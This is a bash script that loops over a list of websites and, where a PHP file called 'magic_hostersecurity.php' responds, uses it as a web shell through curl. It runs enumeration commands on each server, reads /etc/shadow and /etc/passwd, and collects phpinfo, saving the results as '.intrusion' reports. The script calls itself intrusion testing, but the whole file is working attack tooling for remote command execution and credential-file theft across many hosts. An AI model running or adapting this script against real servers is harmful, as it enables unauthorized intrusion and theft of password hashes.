MAGIC_FILE="magic_hostersecurity.php"

function	runtestcommand()
{
	echo "START TEST $4 FOR $1"
	echo "#################################" > tmptest/$3/$4.test
	echo " TEST CASE NAME : $4" >> tmptest/$3/$4.test
	echo " COMMAND : $2" >> tmptest/$3/$4.test
	echo " URL : $1" >> tmptest/$3/$4.test
        echo "#################################" >> tmptest/$3/$4.test
	curl --silent -k "$1$MAGIC_FILE" --data-urlencode "command=$2" >> tmptest/$3/$4.test
	echo "#################################" >> tmptest/$3/$4.test
}

function	runphpinfo()
{
	curl --silent -k "$1$MAGIC_FILE" --data-urlencode "command=phpinfo" >> tmptest/$3/phpinfo.html
}

function	compiletestresults()
{
	cat tmptest/$1/*.test > $1.intrusion
	cat tmptest/$1/phpinfo.html > $1.phpinfo.html
}

function	runtests()
{
	runtestcommand $1 "ls" $2 "test_ls"
	runtestcommand $1 "ls -laR /home/" $2 "test_ls_home"
	runtestcommand $1 "ls -l /etc/" $2 "test_ls_etc"
	runtestcommand $1 "ls -lR /var/" $2 "test_ls_var"
	runtestcommand $1 "cat /etc/shadow 2>&1" $2 "test_cat_shadow"
	runtestcommand $1 "cat /etc/passwd 2>&1" $2 "test_cat_passwd"
	runtestcommand $1 "uname -a" $2 "test_uname"
	runtestcommand $1 "whoami" $2 "test_whoami"
	runtestcommand $1 "groups" $2 "test_my_groups"
	runtestcommand $1 "cat /etc/group" $2 "test_cat_group"
	runtestcommand $1 "ps -fix" $2 "test_process"
	runphpinfo $1 "phpinfo" $2 "test_get_phpinfo"
	compiletestresults $2
	
}


while read URL; do
	STATUS=$(curl -k -s -o /dev/null -w '%{http_code}' "$URL$MAGIC_FILE")
	DOMAIN=$(echo $URL | awk -F/ '{print $3}')

	mkdir -p tmptest/$DOMAIN

	if [ $STATUS -eq 200 ] ; then
		echo "Magic script found ... starting tests"
		runtests $URL $DOMAIN
	else
		echo "No magic script found"
	fi
	rm -rf tmptest/$DOMAIN
	mv tmptest intrusion_tests
	if [ -f *.intrusion ]; then
		mv *.intrusion intrusion_tests
		mv *.phpinfo.html intrusion_tests
	fi
done < websites.txt
